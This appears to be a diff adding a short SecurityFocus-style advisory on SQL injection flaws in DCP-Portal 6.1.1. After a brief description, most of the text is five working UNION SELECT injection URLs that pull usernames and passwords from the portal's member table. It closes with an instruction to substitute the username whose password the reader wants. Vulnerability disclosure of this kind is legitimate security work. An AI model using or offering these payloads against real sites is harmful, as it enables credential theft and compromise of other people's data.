@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/12573/info
+
+DCP-Portal is reportedly affected by multiple SQL injection vulnerabilities. These issues exist because the application fails to properly sanitize user-supplied input before using it in SQL queries.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+These vulnerabilities are reported to affect DCP-Portal 6.1.1; earlier versions may also be affected. 
+
+http://www.example.com/index.php?page=links&catid=1&lcat=-99%27 UNION SELECT null,password FROM dcp5_members WHERE username=%27[username]
+
+http://www.example.com/index.php?page=documents&doc=-99%27 UNION SELECT null,null,username,password, null,null,null,null,null,null,null,null FROM dcp5_members WHERE username=%27[username]
+
+http://www.example.com/index.php?page=mdetails&uid=-99%27 UNION SELECT null,null,null,username,null, null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null FROM dcp5_members WHERE username=%27[username]
+
+http://server.com/forums.php?action=showmsg&mid=-99%27 UNION SELECT null,null,null,password,null, username,null,null,null FROM dcp5_members WHERE username=%27[username]
+
+http://server.com/forums.php?action=board&bid=-99%27UNION SELECT null,null,password,null FROM dcp5_members WHERE username=%27[username]
+
+Replace [username] in the above examples with the user name you wish to retrieve the password for. 
